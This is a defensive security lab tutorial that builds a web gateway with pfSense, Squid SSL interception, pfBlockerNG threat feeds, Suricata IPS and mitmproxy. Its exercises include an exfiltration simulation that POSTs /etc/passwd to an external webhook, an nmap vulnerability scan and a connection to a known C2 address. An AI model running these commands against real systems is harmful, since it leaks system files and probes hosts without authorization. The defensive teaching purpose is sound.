# Module 03 — pfSense + Squid + Suricata + mitmproxy
## Replaces: Netskope (CASB / Secure Web Gateway)

---

## What You'll Build

A full Secure Web Gateway (SWG) and CASB-equivalent stack that:
- Inspects all HTTP/HTTPS traffic with SSL interception
- Blocks malicious domains and IPs (Threat Intelligence feeds)
- Enforces URL filtering by category (blocks social media, ad sites, etc.)
- Detects intrusions with Suricata IPS (Emerging Threats rules)
- Logs all web traffic to Wazuh SIEM
- Simulates cloud app control policies (Netskope equivalent)

---

## Architecture

```
Internet
    │
    │ NAT (WAN — em0)
    ▼
┌─────────────────────────────────────────────┐
│                pfSense CE 2.7               │
│  ┌──────────────────────────────────────┐   │
│  │  Squid Proxy (SSL Bump/Intercept)    │   │
│  │  Port 3128 / Transparent Intercept   │   │
│  └──────────────────────────────────────┘   │
│  ┌──────────────────────────────────────┐   │
│  │  Suricata IPS (Emerging Threats)     │   │
│  │  Inline mode on LAN + OPT1           │   │
│  └──────────────────────────────────────┘   │
│  ┌──────────────────────────────────────┐   │
│  │  pfBlockerNG (IP/Domain Blocking)    │   │
│  │  Threat intel: Feodo, CINS, ET IQR   │   │
│  └──────────────────────────────────────┘   │
└────────────────┬────────────────────────────┘
     LAN (em1)   │    OPT1 (em2)
192.168.10.1     │    192.168.30.1
      │           │         │
[Management]  [Targets]
```

---

## Step 1 — Initial pfSense Setup

After installing pfSense CE from ISO:

1. Boot pfSense, press **1** at menu to assign interfaces:
   - WAN = `em0` (NAT adapter)
   - LAN = `em1` (vboxnet0, Management)
   - OPT1 = `em2` (vboxnet2, Targets)

2. Set IPs:
   - LAN: `192.168.10.1/24`
   - OPT1: `192.168.30.1/24`

3. Access WebGUI: `https://192.168.10.1` (admin/pfsense)

4. Run setup wizard → set strong password

---

## Step 2 — Configure Firewall Rules

### LAN → Any (Management can go anywhere)
```
Action: Pass
Interface: LAN
Protocol: Any
Source: LAN net
Destination: Any
Description: Management network full access
```

### OPT1 → LAN (Targets can reach SIEM/Management)
```
Action: Pass
Interface: OPT1
Protocol: TCP/UDP
Source: 192.168.30.0/24
Destination: 192.168.10.0/24
Ports: 1514,1515,514 (Wazuh + Syslog)
Description: Allow agents to reach Wazuh
```

### OPT1 → Internet via Proxy Only
```
Action: Pass
Interface: OPT1
Protocol: TCP
Source: 192.168.30.0/24
Destination: !192.168.10.0/24
Ports: 3128 (Squid)
Description: Targets use Squid proxy only
```

---

## Step 3 — Install Squid (SSL Interception Proxy)

In pfSense WebGUI → **System → Package Manager → Available Packages**

Install: `squid`

### Squid Configuration (Services → Squid Proxy Server)

**General Settings:**
- Proxy Interface: LAN + OPT1
- Proxy Port: 3128
- Allow users on interface: ✓

**SSL Man-in-the-Middle Filtering:**
- Enable SSL inspection: ✓
- CA Certificate: Create new → **SOC-Lab-CA**
- SSL Mode: **Splice All → Bump Specific**

**Whitelist (Always Allow):**
```
# sites/whitelist.txt — saved in squid/ folder
windows.com
microsoft.com
windowsupdate.com
apple.com
ubuntu.com
debian.org
```

**ACLs — Block these categories:**
```
# Malware/Phishing
acl blocklist dstdomain "/etc/squid/blocklist.txt"
http_access deny blocklist

# Block Tor
acl tor_ports port 9001 9030 9050 9051
http_access deny tor_ports
```

---

## Step 4 — Install pfBlockerNG (IP/Domain Blocking)

In Package Manager → Install: `pfBlockerNG-devel`

### Configure Threat Intel Feeds

Navigate to **Firewall → pfBlockerNG → IP**

Add these free threat intel feeds:

| List | URL | Category |
|---|---|---|
| Feodo Tracker | `https://feodotracker.abuse.ch/downloads/ipblocklist.txt` | Botnet C2 |
| CINS Score | `http://cinsscore.com/list/ci-badguys.txt` | Known Bad IPs |
| Emerging Threats | `https://rules.emergingthreats.net/blockrules/compromised-ips.txt` | Compromised |
| Spamhaus DROP | `https://www.spamhaus.org/drop/drop.txt` | Spam/Malware |
| DShield | `https://www.dshield.org/block.txt` | Attack Sources |

Navigate to **Firewall → pfBlockerNG → DNSBL**

Add DNS Blocklists:
| List | URL |
|---|---|
| Steven Black Hosts | `https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts` |
| Malware Domains | `https://mirror1.malwaredomains.com/files/justdomains` |
| AdGuard DNS | `https://adguardteam.github.io/AdGuardSDNSFilter/Filters/filter.txt` |

---

## Step 5 — Install Suricata IPS (Intrusion Prevention)

In Package Manager → Install: `suricata`

### Configure Suricata

**Services → Suricata → Interfaces** → Add LAN:
- Interface: LAN
- Mode: **Legacy Mode (IPS)**
- Block Offenders: ✓
- Kill States on Drop: ✓

**Rules → Emerging Threats (free):**
- ET Open Rules: ✓ (free, updates daily)
- Select categories: `emerging-malware`, `emerging-exploit`, `emerging-scan`, `emerging-trojan`

Update rules:
```
Services → Suricata → Update → Update Rules
```

---

## Step 6 — Deploy CA Certificate to Target VMs

For SSL inspection to work, targets need to trust your Squid CA:

```bash
# Export CA from pfSense: System → Cert Manager → CA → Export
# Then on each Ubuntu target:

sudo cp SOC-Lab-CA.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates

# For Firefox (Linux):
certutil -A -n "SOC-Lab-CA" -t "CT,," \
    -i SOC-Lab-CA.crt \
    -d "$HOME/.mozilla/firefox/*.default"

# For Windows (PowerShell):
Import-Certificate -FilePath "SOC-Lab-CA.crt" \
    -CertStoreLocation Cert:\LocalMachine\Root
```

---

## Step 7 — mitmproxy for Deep Traffic Analysis

Run on the analyst workstation for Python-based traffic inspection:

```bash
pip3 install mitmproxy

# Transparent proxy mode
mitmproxy --mode transparent \
    --ssl-insecure \
    -p 8080 \
    -s 06-integrations/scripts/mitmproxy-logger.py

# Or as mitmdump for headless logging
mitmdump --mode transparent \
    -p 8080 \
    -w /var/log/mitmproxy/traffic-$(date +%Y%m%d).mitm \
    -s 06-integrations/scripts/mitmproxy-logger.py
```

---

## Hands-On Lab Exercises

### Exercise 1 — SSL Inspection
- From Ubuntu Target: `curl https://example.com -v`
- Verify Squid is intercepting: certificate should show SOC-Lab-CA

### Exercise 2 — Block a Category
- Add `pastebin.com` to Squid blocklist
- From Kali: `curl http://pastebin.com` → should be blocked
- Check pfSense logs → Squid → Access Log

### Exercise 3 — Detect C2 Traffic
- From Kali: `curl http://feodotracker.abuse.ch/downloads/ipblocklist.txt` (get an IP)
- Try connecting to a known C2 IP
- pfBlockerNG should block and log it

### Exercise 4 — Suricata Alert
- From Kali run: `nmap --script=vuln 192.168.30.10`
- Check Suricata alerts: Services → Suricata → Alerts
- Should fire ET SCAN rules

### Exercise 5 — Data Exfiltration Simulation
- From Ubuntu Target: `curl -X POST https://webhook.site/YOUR_ID -d @/etc/passwd`
- Watch Squid access log for POST to suspicious domain
- Write custom Squid ACL to block POST to unknown external domains
